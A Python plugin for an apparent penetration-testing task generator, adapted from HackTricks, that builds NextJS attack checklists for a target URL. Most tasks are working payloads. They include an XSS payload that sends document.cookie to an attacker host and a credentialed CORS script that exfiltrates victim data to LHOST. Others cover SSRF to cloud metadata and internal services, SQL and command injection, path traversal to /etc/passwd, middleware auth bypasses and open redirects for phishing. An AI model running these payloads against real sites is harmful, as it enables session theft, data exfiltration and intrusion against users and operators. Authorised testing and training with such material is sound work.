"""
NextJS Application Security service plugin

Generates tasks for NextJS/React application enumeration and exploitation including:
- NextJS architecture reconnaissance (app directory, middleware, config)
- Client-Side Path Traversal (CSPT/CSRF) via dynamic routing
- Server-Side Rendering (SSR) vulnerabilities
- API Routes exploitation (app/api handlers)
- next.config.js misconfigurations (CORS, image domains, redirects, webpack)
- NextJS middleware bypass techniques
- Static Site Generation (SSG) attacks
- XSS via dangerouslySetInnerHTML and template injection

Extracted from HackTricks: network-services-pentesting/pentesting-web/nextjs.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class NextJSPlugin(ServicePlugin):
    """NextJS/React application security plugin"""

    @property
    def name(self) -> str:
        return "nextjs"

    @property
    def default_ports(self) -> List[int]:
        return [3000, 3001, 8080, 8443, 80, 443]  # NextJS dev: 3000, common prod ports

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect NextJS applications"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check for NextJS/React indicators in product/version
        nextjs_indicators = [
            'next.js', 'nextjs', 'next js',
            'react', 'node.js', 'vercel'
        ]

        if any(indicator in product for indicator in nextjs_indicators):
            return True

        if any(indicator in version for indicator in nextjs_indicators):
            return True

        # Common NextJS development port (only with HTTP service)
        if port == 3000 and 'http' in service:
            return True  # NextJS default dev port

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate NextJS exploitation task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'nextjs-enum-{port}',
            'name': f'NextJS Application Security Assessment (Port {port})',
            'type': 'parent',
            'children': []
        }

        # RECONNAISSANCE PHASE
        recon_parent = {
            'id': f'nextjs-recon-{port}',
            'name': 'NextJS Architecture Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # 1. NextJS Detection and fingerprinting
        recon_parent['children'].append({
            'id': f'nextjs-detect-{port}',
            'name': 'NextJS Framework Detection',
            'type': 'command',
            'metadata': {
                'command': f'curl -i {url}',
                'description': 'Identify NextJS application and detect architecture version (Pages Router vs App Router)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-i': 'Include HTTP headers in output (reveals X-Powered-By, Server)',
                    url: 'Target URL to fingerprint'
                },
                'success_indicators': [
                    'X-Powered-By: Next.js header present',
                    '__NEXT_DATA__ JSON blob in page source',
                    '_next/static/ paths in HTML',
                    'React/NextJS build artifacts visible',
                    'Server: Vercel or Node.js headers'
                ],
                'failure_indicators': [
                    'No NextJS indicators found',
                    'Generic Node.js app without framework signatures',
                    'Headers stripped by reverse proxy'
                ],
                'next_steps': [
                    'Check for /_next/static/chunks/ directory (build info)',
                    'Examine __NEXT_DATA__ for route structure and props',
                    'Identify if using App Router (app/ directory) or Pages Router (pages/)',
                    'Look for exposed .env files at /.env.local',
                    'Test for exposed source maps: /_next/static/chunks/*.js.map'
                ],
                'alternatives': [
                    f'whatweb {url} -v (automated framework detection)',
                    f'Browser: View page source and search for "_next" or "__NEXT_DATA__"',
                    f'curl {url}/_next/static/ (check build directory)',
                    f'nmap --script http-headers -p {port} {target}'
                ],
                'notes': 'NextJS apps expose __NEXT_DATA__ JSON containing page props, routes, and build info. Source maps reveal full source code.',
                'estimated_time': '2-3 minutes'
            }
        })

        # 2. Configuration file enumeration
        recon_parent['children'].append({
            'id': f'nextjs-config-enum-{port}',
            'name': 'NextJS Configuration File Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Enumerate exposed NextJS config files for sensitive info and misconfigurations',
                'tags': ['MANUAL', 'OSCP:HIGH', 'QUICK_WIN'],
                'alternatives': [
                    '# Check for exposed configuration:',
                    f'curl {url}/.env.local (environment variables - HIGH VALUE)',
                    f'curl {url}/.env',
                    f'curl {url}/.env.production',
                    f'curl {url}/next.config.js (NextJS config - may reveal secrets)',
                    f'curl {url}/next-env.d.ts',
                    f'curl {url}/tsconfig.json',
                    f'curl {url}/package.json (dependency versions for CVE research)',
                    f'curl {url}/vercel.json (Vercel deployment config)',
                    '',
                    '# Check for source maps:',
                    f'curl {url}/_next/static/chunks/pages/_app*.js.map',
                    f'curl {url}/_next/static/chunks/main*.js.map',
                    '',
                    '# API route enumeration:',
                    f'curl {url}/api/ (list API routes if directory browsing enabled)',
                    f'curl {url}/api/hello (default NextJS API route)',
                    f'ffuf -u {url}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt'
                ],
                'success_indicators': [
                    '.env.local leaked (API keys, database creds, secrets)',
                    'next.config.js exposed (CORS, image domains, redirects)',
                    'package.json reveals dependency versions',
                    'Source maps allow full code review',
                    'API routes discovered'
                ],
                'failure_indicators': [
                    'All config files return 404',
                    'Access denied / 403',
                    'Production build hides all artifacts'
                ],
                'next_steps': [
                    'Extract secrets from .env files',
                    'Review next.config.js for CORS misconfigs (Access-Control-Allow-Origin: *)',
                    'Check image.domains for wildcard or user-controlled domains',
                    'Analyze redirects for open redirect vulnerabilities',
                    'Map all API routes from source maps or __NEXT_DATA__',
                    'Search source maps for hardcoded credentials, API keys, internal URLs'
                ],
                'notes': '.env.local should NEVER be exposed in production. next.config.js can reveal security headers, CORS, and dangerous webpack configs.'
            }
        })

        # 3. Route structure mapping
        recon_parent['children'].append({
            'id': f'nextjs-routes-{port}',
            'name': 'NextJS Route Structure Mapping',
            'type': 'manual',
            'metadata': {
                'description': 'Map NextJS file-based routing structure (static, dynamic, catch-all routes)',
                'tags': ['MANUAL', 'OSCP:MEDIUM', 'ENUM'],
                'alternatives': [
                    '# Extract routes from __NEXT_DATA__:',
                    f'curl {url} | grep -oP "__NEXT_DATA__.*?</script>" | jq .props.pageProps',
                    '',
                    '# Test common NextJS routes:',
                    f'curl {url}/ (root page.tsx)',
                    f'curl {url}/about (static route)',
                    f'curl {url}/posts/123 (dynamic route [id])',
                    f'curl {url}/dashboard/settings/profile (nested routes)',
                    f'curl {url}/anything/goes/here (catch-all [...slug])',
                    '',
                    '# API route discovery:',
                    f'curl {url}/api/hello',
                    f'curl {url}/api/users/1',
                    f'curl -X POST {url}/api/submit',
                    '',
                    '# Source map route extraction:',
                    'Download .js.map files → search for "app/" or "pages/" directory structure'
                ],
                'success_indicators': [
                    'Route structure mapped from __NEXT_DATA__ or source maps',
                    'Dynamic routes identified ([id], [slug])',
                    'Catch-all routes found ([...path])',
                    'API routes enumerated',
                    'Hidden/admin routes discovered'
                ],
                'next_steps': [
                    'Test dynamic routes for injection: /posts/<script>alert(1)</script>',
                    'Test catch-all routes for path traversal: /[...slug]/../../../etc/passwd',
                    'Fuzz API routes for missing authentication',
                    'Check if middleware.ts protects sensitive routes',
                    'Test for IDOR in dynamic routes: /api/users/[id]'
                ],
                'notes': 'NextJS uses file-based routing. Directory structure = URL structure. [param] = dynamic, [...param] = catch-all.'
            }
        })

        tasks['children'].append(recon_parent)

        # VULNERABILITY TESTING PHASE
        vuln_parent = {
            'id': f'nextjs-vuln-{port}',
            'name': 'NextJS Vulnerability Testing',
            'type': 'parent',
            'children': []
        }

        # 4. Client-Side Path Traversal (CSPT) / CSRF
        vuln_parent['children'].append({
            'id': f'nextjs-cspt-{port}',
            'name': 'Client-Side Path Traversal (CSPT) Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test for Client-Side Path Traversal leading to CSRF via manipulated file paths',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CSRF'],
                'alternatives': [
                    '# Example vulnerable NextJS code:',
                    '# pages/download.js: fetch(`/api/files/${filePath}`)',
                    '',
                    '# Exploit: Path traversal to trigger unintended API calls',
                    f'curl "{url}?filePath=../deleteFile/config.json" (CSRF via path manipulation)',
                    f'curl "{url}/api/files/../admin/delete?file=important.txt"',
                    '',
                    '# Test in browser (for CSRF):',
                    '# Victim visits: http://attacker.tld/csrf.html',
                    '# Page contains: <img src="http://TARGET/api/files/../admin/delete?file=config.json">',
                    '',
                    '# Identify vulnerable patterns:',
                    'const filePath = req.query.filePath;  // User-controlled',
                    'fetch(`/api/files/${filePath}`);      // No validation!',
                    '',
                    '# Attack scenarios:',
                    '1. Path traversal: /api/files/../admin/sensitive',
                    '2. CSRF: Force victim to make state-changing requests',
                    '3. API abuse: Access internal endpoints via path manipulation'
                ],
                'success_indicators': [
                    'Path traversal allows access to unintended API routes',
                    'CSRF attack successfully triggers admin action',
                    'Internal API endpoints accessible via ../ manipulation',
                    'File deletion or modification occurs',
                    'Authentication bypass via path rerouting'
                ],
                'failure_indicators': [
                    'Server validates and sanitizes file paths',
                    'API routes have CSRF tokens',
                    'SameSite cookies prevent CSRF',
                    'Path normalization blocks ../ traversal'
                ],
                'next_steps': [
                    'Map all client-side fetch() calls with user-controlled paths',
                    'Test API routes for missing CSRF protection',
                    'Craft CSRF payload using traversed paths',
                    'Chain with XSS if available for better CSRF delivery',
                    'Test for SSRF if internal URLs reachable'
                ],
                'notes': 'NextJS client-side routing allows path manipulation. Unlike server path traversal (file access), CSPT abuses client fetch() to hit unintended APIs. Server must validate paths AND implement CSRF protection.'
            }
        })

        # 5. XSS via dangerouslySetInnerHTML
        vuln_parent['children'].append({
            'id': f'nextjs-xss-{port}',
            'name': 'XSS via dangerouslySetInnerHTML Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test for XSS through dangerouslySetInnerHTML or client-side template injection',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'XSS'],
                'alternatives': [
                    '# Vulnerable React/NextJS pattern:',
                    '<div dangerouslySetInnerHTML={{ __html: userInput }} />',
                    '',
                    '# Test payloads:',
                    f'curl "{url}?comment=<img src=x onerror=alert(document.domain)>"',
                    f'curl "{url}?name=<script>fetch(\'http://LHOST/\'+document.cookie)</script>"',
                    f'curl -X POST -H "Content-Type: application/json" \\',
                    f'  -d \'{{"content":"<svg onload=alert(1)>"}}\' \\',
                    f'  {url}/api/comment',
                    '',
                    '# Client-side template injection (if using eval or new Function):',
                    '${alert(1)}',
                    '{{constructor.constructor(\'alert(1)\')()}}',
                    '',
                    '# Test input reflection points:',
                    '- URL parameters reflected in page',
                    '- POST body rendered in comments/messages',
                    '- JSON API responses rendered client-side',
                    '- Error messages with user input'
                ],
                'success_indicators': [
                    'JavaScript alert fires',
                    'Cookies exfiltrated to attacker server',
                    'User input rendered as HTML without encoding',
                    'dangerouslySetInnerHTML confirmed in source',
                    'DOM-based XSS via client-side rendering'
                ],
                'failure_indicators': [
                    'Input sanitized (DOMPurify, etc)',
                    'Content-Security-Policy blocks inline scripts',
                    'React escapes all user input by default',
                    'No dangerouslySetInnerHTML usage found'
                ],
                'next_steps': [
                    'Review source maps for all dangerouslySetInnerHTML usage',
                    'Check if Content-Security-Policy header present',
                    'Test for CSP bypass: data: URIs, nonces, unsafe-inline',
                    'Chain XSS with CSRF for admin account takeover',
                    'Steal JWT tokens or session cookies',
                    'Perform client-side template injection if eval() found'
                ],
                'notes': 'React escapes by default. XSS only possible via dangerouslySetInnerHTML, eval(), or new Function(). Always check CSP and HttpOnly cookie flags.'
            }
        })

        # 6. Server-Side Rendering (SSR) vulnerabilities
        vuln_parent['children'].append({
            'id': f'nextjs-ssr-{port}',
            'name': 'Server-Side Rendering (SSR) Vulnerabilities',
            'type': 'manual',
            'metadata': {
                'description': 'Test for SSR-specific vulnerabilities in getServerSideProps and custom servers',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'SSRF'],
                'alternatives': [
                    '# SSR injection via getServerSideProps:',
                    '# Vulnerable code:',
                    'export async function getServerSideProps(context) {',
                    '  const url = context.query.url;  // User-controlled!',
                    '  const res = await fetch(url);   // SSRF!',
                    '  const data = await res.json();',
                    '  return { props: { data } };',
                    '}',
                    '',
                    '# Exploit SSRF:',
                    f'curl "{url}?url=http://169.254.169.254/latest/meta-data/" (AWS metadata)',
                    f'curl "{url}?url=http://localhost:6379/" (internal Redis)',
                    f'curl "{url}?url=file:///etc/passwd" (LFI if file:// protocol allowed)',
                    '',
                    '# Command injection in custom server:',
                    '# server.js: app.render(req, res, `/post/${req.query.id}`)',
                    f'curl "{url}/post/1;whoami" (command injection if shell execution)',
                    '',
                    '# Test for SQL injection in SSR data fetching:',
                    f'curl "{url}?id=1\' OR \'1\'=\'1" (SQLi in getServerSideProps query)'
                ],
                'success_indicators': [
                    'SSRF confirmed (internal network accessible)',
                    'AWS metadata leaked',
                    'Internal service responses visible',
                    'SQL injection in SSR data fetching',
                    'Command injection in custom server',
                    'File read via file:// protocol'
                ],
                'failure_indicators': [
                    'URL validation blocks SSRF',
                    'No user input in fetch() calls',
                    'Protocol whitelist (http/https only)',
                    'Network segmentation blocks internal access'
                ],
                'next_steps': [
                    'Map all getServerSideProps usage from source maps',
                    'Test every user-controlled parameter in SSR',
                    'Enumerate internal network via SSRF',
                    'Try DNS exfil: Burp Collaborator or interact.sh',
                    'Chain SSRF with cloud metadata for RCE (AWS IMDSv1)',
                    'Test for XXE if XML parsing occurs server-side'
                ],
                'notes': 'SSR runs on server → SSRF, SQLi, command injection possible. Check getServerSideProps and custom server.js for user input handling.'
            }
        })

        tasks['children'].append(vuln_parent)

        # CONFIGURATION EXPLOITATION PHASE
        config_parent = {
            'id': f'nextjs-config-{port}',
            'name': 'NextJS Configuration Exploitation',
            'type': 'parent',
            'children': []
        }

        # 7. next.config.js CORS misconfiguration
        config_parent['children'].append({
            'id': f'nextjs-cors-{port}',
            'name': 'CORS Misconfiguration Exploitation (next.config.js / middleware.ts)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit overly permissive CORS settings in next.config.js or middleware.ts',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'CORS'],
                'alternatives': [
                    '# Test for CORS misconfiguration:',
                    f'curl -H "Origin: https://evil.com" -i {url}/api/sensitive',
                    '',
                    '# Check response for:',
                    'Access-Control-Allow-Origin: * (worst case - allows any origin)',
                    'Access-Control-Allow-Origin: https://evil.com (reflects our origin)',
                    'Access-Control-Allow-Credentials: true (allows cookies)',
                    '',
                    '# Vulnerable next.config.js:',
                    'headers: [{ key: "Access-Control-Allow-Origin", value: "*" }]',
                    '',
                    '# Vulnerable middleware.ts:',
                    'response.headers.set("Access-Control-Allow-Origin", origin || "")',
                    '',
                    '# Exploit: Steal data via CORS',
                    '# Host on attacker.tld:',
                    '<script>',
                    'fetch("http://TARGET/api/sensitive", {',
                    '  credentials: "include"  // Send victim cookies',
                    '}).then(r => r.json())',
                    '  .then(data => fetch("http://LHOST/exfil?data="+btoa(JSON.stringify(data))))',
                    '</script>',
                    '',
                    '# Send victim to: http://attacker.tld/cors.html',
                    '# Attacker receives sensitive data from victim session'
                ],
                'success_indicators': [
                    'Access-Control-Allow-Origin: * or reflected origin',
                    'Access-Control-Allow-Credentials: true',
                    'Sensitive API accessible cross-origin',
                    'Data exfiltrated from victim session',
                    'CORS preflight bypassed'
                ],
                'failure_indicators': [
                    'CORS properly restricted (whitelist only)',
                    'No Access-Control-Allow-Credentials',
                    'API requires CSRF tokens',
                    'SameSite=Strict cookies prevent attack'
                ],
                'next_steps': [
                    'Identify all API routes with sensitive data',
                    'Test if credentials included in CORS policy',
                    'Craft CORS exploit page',
                    'Chain with XSS for same-origin bypass',
                    'Test CORS bypass techniques: null origin, subdomain takeover',
                    'Check for CORS misconfig in middleware.ts (app-wide CORS)'
                ],
                'notes': 'NextJS CORS configured in next.config.js headers() or middleware.ts. Wildcard (*) with credentials = game over. See HackTricks CORS bypass page.'
            }
        })

        # 8. Image optimization abuse
        config_parent['children'].append({
            'id': f'nextjs-image-abuse-{port}',
            'name': 'Image Optimization Domain Abuse',
            'type': 'manual',
            'metadata': {
                'description': 'Abuse misconfigured image.domains in next.config.js for SSRF or phishing',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'SSRF'],
                'alternatives': [
                    '# Vulnerable next.config.js:',
                    'images: {',
                    '  domains: ["*"],  // Allows images from ANY domain',
                    '  // or',
                    '  domains: ["raw.githubusercontent.com"],  // User-controlled uploads',
                    '}',
                    '',
                    '# Exploit: SSRF via image optimization',
                    f'curl "{url}/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1920&q=75"',
                    f'curl "{url}/_next/image?url=http://localhost:6379/&w=100&q=75" (internal Redis)',
                    f'curl "{url}/_next/image?url=http://internal-admin:8080/&w=500&q=75"',
                    '',
                    '# Phishing via allowed domain with user uploads:',
                    '1. Upload malicious image to raw.githubusercontent.com',
                    '2. NextJS serves it via /_next/image',
                    '3. Appears to come from trusted TARGET domain',
                    '',
                    '# Test script:',
                    'for port in 22 80 443 3306 5432 6379 8080; do',
                    f'  curl -i "{url}/_next/image?url=http://127.0.0.1:$port/&w=100&q=75" &',
                    'done',
                    'wait'
                ],
                'success_indicators': [
                    'SSRF successful (internal resources loaded)',
                    'AWS metadata accessible',
                    'Internal service banners leaked',
                    'Arbitrary external images served via /_next/image',
                    'User-controlled domains allowed'
                ],
                'failure_indicators': [
                    'Domain whitelist properly configured',
                    'No wildcard domains',
                    'SSRF protections block internal IPs',
                    '/_next/image returns 400 for invalid domains'
                ],
                'next_steps': [
                    'Enumerate internal network via image SSRF',
                    'Try DNS exfiltration via image URLs',
                    'Upload malicious images to allowed domains',
                    'Chain with XSS if images rendered unsafely',
                    'Test for file:// protocol support (unlikely but worth trying)',
                    'Check remotePatterns config (NextJS 13+) for bypasses'
                ],
                'notes': 'NextJS image optimization proxies external images. Wildcard domains or user-upload domains = SSRF. Check next.config.js images.domains and images.remotePatterns.'
            }
        })

        # 9. Open redirect via next.config.js redirects
        config_parent['children'].append({
            'id': f'nextjs-open-redirect-{port}',
            'name': 'Open Redirect via next.config.js',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit dynamic redirects in next.config.js for phishing and credential theft',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PHISHING'],
                'alternatives': [
                    '# Vulnerable next.config.js:',
                    'async redirects() {',
                    '  return [{',
                    '    source: "/redirect",',
                    '    destination: (req) => req.query.url,  // User-controlled!',
                    '    permanent: false',
                    '  }]',
                    '}',
                    '',
                    '# Exploit:',
                    f'{url}/redirect?url=https://evil.com/phishing',
                    f'{url}/redirect?url=https://evil.com/login-steal-creds',
                    '',
                    '# Phishing attack:',
                    '1. Send victim: "Click here to verify account: http://TRUSTED-SITE.com/redirect?url=http://phishing.evil"',
                    '2. Victim sees TRUSTED-SITE.com in email',
                    '3. Redirects to evil.com phishing page',
                    '4. Victim enters creds thinking it\'s legitimate',
                    '',
                    '# Test for open redirect:',
                    f'curl -i "{url}/redirect?url=https://example.com"',
                    f'curl -i "{url}/goto?next=https://example.com"',
                    f'curl -i "{url}/auth/callback?redirect=https://example.com"',
                    '',
                    '# Common redirect parameters:',
                    '?url=, ?next=, ?redirect=, ?return=, ?goto=, ?continue='
                ],
                'success_indicators': [
                    'HTTP 301/302 redirect to attacker-controlled URL',
                    'Location header shows external site',
                    'No URL validation or whitelist',
                    'Redirect works with any domain'
                ],
                'failure_indicators': [
                    'URL validation rejects external domains',
                    'Whitelist enforced',
                    'Redirect only accepts relative paths',
                    'Returns 400 for invalid URLs'
                ],
                'next_steps': [
                    'Map all redirect endpoints',
                    'Test bypass techniques: //evil.com, \\\\evil.com, @evil.com',
                    'Chain with OAuth for account takeover',
                    'Use for phishing campaigns',
                    'Test for SSRF if internal URLs allowed'
                ],
                'notes': 'Open redirects enable phishing by making malicious URLs appear to come from trusted domain. NextJS redirects() in next.config.js often misused. Always validate destination URLs.'
            }
        })

        # 10. Webpack configuration exposure
        config_parent['children'].append({
            'id': f'nextjs-webpack-exposure-{port}',
            'name': 'Webpack Configuration Exposure',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit webpack misconfigurations that expose sensitive modules or paths',
                'tags': ['OSCP:LOW', 'RECON'],
                'alternatives': [
                    '# Vulnerable next.config.js webpack config:',
                    'webpack: (config, { isServer }) => {',
                    '  if (!isServer) {',
                    '    config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")',
                    '  }',
                    '  return config',
                    '}',
                    '',
                    '# Identify webpack exposure:',
                    f'curl {url}/_next/static/chunks/*.js | grep -oP "sensitive|secret|config|admin"',
                    '',
                    '# Download all source maps:',
                    f'wget -r -np -nH --cut-dirs=2 -R "index.html*" {url}/_next/static/',
                    '',
                    '# Analyze source maps for secrets:',
                    'find . -name "*.js.map" -exec grep -H "password\\|secret\\|key\\|token\\|api_key" {{}} \\;',
                    '',
                    '# Check for exposed sensitive aliases:',
                    'grep -r "@sensitive" *.js.map',
                    'grep -r "secret-folder" *.js.map',
                    '',
                    '# Look for hardcoded credentials:',
                    r'grep -rE "(apiKey|API_KEY|secretKey|password|token).*=.*[\"' + r"']" + r'\w+" *.js'
                ],
                'success_indicators': [
                    'Source maps reveal sensitive module paths',
                    'Hardcoded API keys or secrets found',
                    'Internal directory structure leaked',
                    'Development-only code bundled in production',
                    'Credentials or tokens in JavaScript'
                ],
                'failure_indicators': [
                    'Source maps disabled in production',
                    'No sensitive aliases in webpack config',
                    'Secrets properly externalized (env vars)',
                    'Webpack minification hides structure'
                ],
                'next_steps': [
                    'Extract all secrets from source maps',
                    'Map internal directory structure',
                    'Look for commented-out code with creds',
                    'Check for debug/test endpoints in code',
                    'Use extracted secrets to access APIs/databases'
                ],
                'notes': 'Webpack aliases can expose sensitive paths. Source maps are goldmine for code review. Always disable source maps in production and externalize secrets.'
            }
        })

        tasks['children'].append(config_parent)

        # API ROUTES EXPLOITATION PHASE
        api_parent = {
            'id': f'nextjs-api-{port}',
            'name': 'NextJS API Routes Exploitation',
            'type': 'parent',
            'children': []
        }

        # 11. API route enumeration and abuse
        api_parent['children'].append({
            'id': f'nextjs-api-enum-{port}',
            'name': 'API Route Enumeration and Authentication Bypass',
            'type': 'command',
            'metadata': {
                'command': f'ffuf -u {url}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,401,403',
                'description': 'Enumerate NextJS API routes (app/api/ directory) and test for missing authentication',
                'tags': ['OSCP:HIGH', 'ENUM', 'API'],
                'flag_explanations': {
                    '-u': 'Target URL pattern with FUZZ placeholder',
                    '-w': 'Wordlist of common API endpoint names',
                    '-mc': 'Match HTTP status codes (200=success, 401/403=auth required but exists)'
                },
                'success_indicators': [
                    'API routes discovered: /api/users, /api/admin, /api/config',
                    '401/403 responses reveal protected endpoints',
                    '200 responses indicate accessible APIs',
                    'Sensitive data returned without auth'
                ],
                'failure_indicators': [
                    'All API routes return 404',
                    'Rate limiting blocks enumeration',
                    'WAF detects and blocks fuzzing'
                ],
                'next_steps': [
                    'Test discovered APIs for auth bypass',
                    'Check if middleware.ts protects /api/* routes',
                    'Test IDOR in /api/users/[id] endpoints',
                    'Fuzz API parameters for injection (SQLi, NoSQLi, command injection)',
                    'Test HTTP method tampering (GET vs POST)',
                    'Check for mass assignment vulnerabilities',
                    'Test for JWT token manipulation'
                ],
                'alternatives': [
                    f'Manual: curl {url}/api/hello, /api/users, /api/admin',
                    f'gobuster dir -u {url}/api -w /usr/share/wordlists/dirb/common.txt',
                    f'dirsearch -u {url}/api/ -w api-wordlist.txt',
                    'Extract API routes from source maps or __NEXT_DATA__'
                ],
                'notes': 'NextJS API routes in app/api/ are serverless functions. Missing auth in middleware.ts = unauthenticated access. Check route.ts files.',
                'estimated_time': '5-10 minutes'
            }
        })

        # 12. Catch-all API route abuse
        api_parent['children'].append({
            'id': f'nextjs-catchall-api-{port}',
            'name': 'Catch-All API Route Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit catch-all API routes ([...slug]) for path traversal and unintended access',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'API'],
                'alternatives': [
                    '# Catch-all route example:',
                    '# app/api/[...slug]/route.js',
                    'export async function GET(request, { params }) {',
                    '  const { slug } = params;  // ["any", "nested", "path"]',
                    '  // Process slug without validation!',
                    '}',
                    '',
                    '# Test for catch-all abuse:',
                    f'curl {url}/api/anything/here/works (should match catch-all)',
                    f'curl {url}/api/../admin/secret',
                    f'curl {url}/api/proxy/http://internal-service/',
                    '',
                    '# Path traversal via catch-all:',
                    f'curl {url}/api/files/../../../../etc/passwd',
                    f'curl {url}/api/resource/../../../admin/config',
                    '',
                    '# Nested parameter injection:',
                    f'curl "{url}/api/data/;id/test" (command injection)',
                    f'curl "{url}/api/query/1\' OR \'1\'=\'1" (SQL injection)',
                    '',
                    '# Test for SSRF if slug used in fetch():',
                    f'curl {url}/api/fetch/http://169.254.169.254/latest/meta-data/'
                ],
                'success_indicators': [
                    'Catch-all route accepts arbitrary paths',
                    'Path traversal successful',
                    'Internal resources accessible',
                    'SQL/NoSQL injection in slug parameters',
                    'Command injection via slug',
                    'SSRF if slug used in HTTP requests'
                ],
                'failure_indicators': [
                    'Slug properly validated',
                    'Path normalization prevents traversal',
                    'Input sanitization blocks injection',
                    '404 for invalid paths'
                ],
                'next_steps': [
                    'Map all catch-all routes from source maps',
                    'Test every catch-all for path traversal',
                    'Inject special characters in slug: ../, ;, \', ", <, >',
                    'Test for SSRF if slug used in fetch/axios',
                    'Check for command injection if slug used in exec()',
                    'Fuzz slug parameters thoroughly'
                ],
                'notes': 'Catch-all routes ([...slug]) capture all remaining path segments. Without validation, they allow path traversal, injection, and SSRF. Always sanitize slug arrays.'
            }
        })

        tasks['children'].append(api_parent)

        # MIDDLEWARE EXPLOITATION PHASE
        middleware_parent = {
            'id': f'nextjs-middleware-{port}',
            'name': 'NextJS Middleware Exploitation',
            'type': 'parent',
            'children': []
        }

        # 13. Middleware authentication bypass
        middleware_parent['children'].append({
            'id': f'nextjs-middleware-bypass-{port}',
            'name': 'Middleware Authentication Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Test for authentication bypass in middleware.ts logic',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTH_BYPASS'],
                'alternatives': [
                    '# Vulnerable middleware.ts pattern:',
                    'export function middleware(req: NextRequest) {',
                    '  if (!req.cookies.has("token")) {',
                    '    return NextResponse.redirect("/login");',
                    '  }',
                    '  return NextResponse.next();',
                    '}',
                    'export const config = { matcher: ["/protected/:path*"] };',
                    '',
                    '# Test bypass techniques:',
                    f'# 1. Path traversal bypass:',
                    f'curl {url}/protected/../admin (bypass matcher)',
                    '',
                    f'# 2. HTTP method bypass (if middleware only checks GET):',
                    f'curl -X POST {url}/protected/admin',
                    f'curl -X OPTIONS {url}/protected/admin',
                    '',
                    f'# 3. Case sensitivity bypass:',
                    f'curl {url}/Protected/admin',
                    f'curl {url}/PROTECTED/admin',
                    '',
                    f'# 4. Trailing slash bypass:',
                    f'curl {url}/protected (middleware matches /protected/:path*)',
                    f'curl {url}/protected/ (may bypass)',
                    '',
                    f'# 5. Cookie manipulation:',
                    f'curl -H "Cookie: token=fake" {url}/protected/admin',
                    f'curl -H "Cookie: token=" {url}/protected/admin (empty token)',
                    '',
                    f'# 6. Header injection:',
                    f'curl -H "X-Forwarded-Proto: https" {url}/protected/admin',
                    f'curl -H "X-Original-URL: /public" {url}/protected/admin'
                ],
                'success_indicators': [
                    'Protected route accessible without auth',
                    'Middleware bypassed via path manipulation',
                    'HTTP method tampering succeeds',
                    'Invalid token accepted',
                    'Case sensitivity exploited'
                ],
                'failure_indicators': [
                    'All bypass attempts blocked',
                    'Middleware properly validates all paths',
                    'Token validation robust',
                    'Comprehensive matcher config'
                ],
                'next_steps': [
                    'Review middleware.ts source code (from source maps)',
                    'Test all matcher patterns for bypasses',
                    'Check if middleware validates JWT properly',
                    'Test for race conditions in auth checks',
                    'Try OAuth callback manipulation',
                    'Chain with CSRF if middleware only checks origin'
                ],
                'notes': 'NextJS middleware.ts runs before request processing. Bypass = full auth bypass. Common issues: incomplete matchers, weak token validation, path normalization bugs.'
            }
        })

        tasks['children'].append(middleware_parent)

        # RESEARCH PHASE
        if version:
            research_parent = {
                'id': f'nextjs-research-{port}',
                'name': f'Vulnerability Research: {product} {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'nextjs-searchsploit-{port}',
                        'name': f'SearchSploit: Next.js {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "next.js {version}"',
                            'description': 'Search ExploitDB for known NextJS vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'ExploitDB search tool',
                                'next.js': 'NextJS framework name',
                                version: 'Version to search for'
                            },
                            'alternatives': [
                                'searchsploit nextjs',
                                'searchsploit "next js"',
                                'searchsploit react server',
                                'Browse https://www.exploit-db.com/'
                            ]
                        }
                    },
                    {
                        'id': f'nextjs-cve-{port}',
                        'name': f'CVE Lookup: NextJS',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Research known CVEs for NextJS and dependencies',
                            'tags': ['RESEARCH', 'OSCP:MEDIUM'],
                            'alternatives': [
                                'Google: "next.js CVE"',
                                'https://nvd.nist.gov/',
                                'https://cve.mitre.org/',
                                'https://github.com/vercel/next.js/security/advisories',
                                'Check package.json dependencies for outdated versions',
                                'npm audit (if you have package.json)',
                                'Known issues:',
                                '  - Image optimization SSRF (various versions)',
                                '  - Middleware bypass vulnerabilities',
                                '  - XSS in error pages',
                                '  - CSRF in API routes',
                                '  - Open redirects in built-in authentication'
                            ]
                        }
                    }
                ]
            }
            tasks['children'].append(research_parent)

        return tasks
